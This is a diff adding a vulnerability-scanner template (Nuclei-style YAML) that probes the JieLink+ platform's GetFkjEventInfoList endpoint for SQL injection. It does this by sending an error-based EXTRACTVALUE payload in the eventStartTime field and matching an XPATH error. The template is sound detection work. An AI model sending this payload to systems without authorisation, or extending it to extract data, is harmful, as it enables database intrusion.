@@ -1,0 +1,33 @@
+id: jielink-plus-getfkjeventinfolist-sqli
+info:
+  name: JieLink+ Intelligent Terminal Platform GetFkjEventInfoList SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /report/fkj/GetFkjEventInfoList HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        eventStartTime=' AND EXTRACTVALUE(4817,CONCAT(0x7e,{{t2}},0x7e)) AND 'qVLu'='qVLu&eventEndTime=&deviceIp=&deviceName=&eventTypeName=&eventContent=&page=1&rows=20
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "location.href"
+      - type: word
+        words:
+          - "XPATH syntax error"
+      - type: regex
+        regex:
+          - "{{t2}}"
